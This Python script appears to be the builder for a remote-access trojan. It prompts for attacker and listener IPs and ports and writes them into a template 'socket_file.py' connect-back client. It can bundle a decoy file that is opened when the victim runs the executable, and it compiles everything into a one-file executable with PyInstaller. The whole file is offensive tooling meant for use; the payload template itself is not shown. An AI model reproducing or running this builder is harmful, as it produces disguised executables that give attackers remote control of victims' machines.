import os
import re
import subprocess
from datetime import datetime
from urllib.request import urlopen

d = str(urlopen("http://checkip.dyndns.com/").read())
IPAddr = re.compile(r"Address: (\d+\.\d+\.\d+\.\d+)").search(d).group(1)

RHOST = input("RHOST ("+IPAddr+" / not recommended): ")
if RHOST == "":
    RHOST = IPAddr
RPORT = input("RPORT (8080): ")
if RPORT == "":
    RPORT = 8080

default_lhost = ""
if_config = subprocess.check_output(["ifconfig", "wlan0"]).decode()
ip_addr = re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", if_config)
if ip_addr:
    default_lhost = "("+ip_addr.group(0)+")"

LHOST = input("LHOST "+default_lhost+": ")
if LHOST == "" and ip_addr:
    LHOST = ip_addr.group(0)
elif LHOST == "":
    print("Error! You must use wifi adapter in your virtual machine")
    exit()
LPORT = input("LPORT (8080): ")
if LPORT == "":
    LPORT = 8080

file_name = input("executable name: ")
added_file_name = ""
file_choice = input("Do you want to add file to your executable ? (y/N)")
file_path = ""
if not file_choice == "" and file_choice.lower() == "y":
    file_path = input("file path:")
    added_file_name = os.path.basename(file_path)


f = open("logs/variable_logs.txt", "a")
f.write(datetime.now().strftime("\n# "+"%d/%m/%Y-%H:%M:%S") + " {'LHOST':'" + str(LHOST) + "','LPORT':" + str(LPORT) + ",'RHOST':'" + str(RHOST) + "','RPORT':" + str(RPORT) + "}")
f.close()

with open("socket_file.py", "r") as sc:
    lines = sc.readlines()
    file_count = 0
    count = 0
    for line in lines:
        if "my_socket" in line:
            break
        count += 1
    if added_file_name == "":
        check_if_opens = False
        for line in lines:
            if "open_added_file()" in line and "def" not in line:
                check_if_opens = True
                break
            file_count += 1
        if check_if_opens:
            lines[file_count] = "\n"
    else:
        for line in lines:
            if "added_file_path" in line:
                break
            file_count += 1
        lines[file_count] = """    added_file_path = sys._MEIPASS + "\\\{}"\n""".format(added_file_name)
        lines[file_count + 1] = """    subprocess.Popen(added_file_path, shell=True)\n"""
        lines[file_count + 4] = """open_added_file()\n"""
    lines[count - 2] = """IPAddr = "{}"\n""".format(RHOST)
    lines[count - 1] = "Port = {}\n".format(RPORT)
with open("socket_file.py", "w") as sc:
    for line in lines:
        sc.write(line)

try:
    if file_name == "" and (not added_file_name == "" or not file_path == ""):
        subprocess.run(["pyinstaller", "socket_file.py", "--onefile", "--add-data", "\"{}.\"".format(file_path)], stdout=subprocess.DEVNULL)
    elif file_name == "":
        subprocess.run(["pyinstaller", "socket_file.py", "--onefile"], stdout=subprocess.DEVNULL)
    else:
        subprocess.run(["pyinstaller", "socket_file.py", "-n", file_name, "--onefile"], stdout=subprocess.DEVNULL)
except Exception as e:
    user_choice = input("You must install 'pyinstaller' module. Do you want me to install it for you ? (Y/n)")
    if user_choice == "" or user_choice.lower() == "y":
        subprocess.run(["python3", "-m", "pip", "install", "pyinstaller"])
        if file_name == "" and (not added_file_name == "" or not file_path == ""):
            subprocess.run(["pyinstaller", "socket_file.py", "--onefile", "--add-data", "\"{}.\"".format(file_path)],
                           stdout=subprocess.DEVNULL)
        elif file_name == "":
            subprocess.run(["pyinstaller", "socket_file.py", "--onefile"], stdout=subprocess.DEVNULL)
        else:
            subprocess.run(["pyinstaller", "socket_file.py", "-n", file_name, "--onefile"], stdout=subprocess.DEVNULL)
    else:
        exit()
